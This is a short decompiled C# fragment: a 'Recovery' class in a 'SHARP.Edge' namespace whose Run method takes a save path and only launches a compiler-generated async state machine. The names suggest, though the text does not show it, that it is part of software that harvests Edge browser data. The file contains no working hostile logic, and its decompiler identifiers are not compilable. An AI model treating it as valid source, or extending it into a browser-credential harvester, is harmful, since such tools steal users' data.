﻿using System;
using System.Runtime.CompilerServices;

namespace SHARP.Edge
{
	// Token: 0x02000079 RID: 121
	internal sealed class Recovery
	{
		// Token: 0x0600028E RID: 654 RVA: 0x0000FD6C File Offset: 0x0000DF6C
		public static void Run(string sSavePath)
		{
			Recovery.<Run>d__0 <Run>d__;
			<Run>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<Run>d__.sSavePath = sSavePath;
			<Run>d__.<>1__state = -1;
			<Run>d__.<>t__builder.Start<Recovery.<Run>d__0>(ref <Run>d__);
		}
	}
}
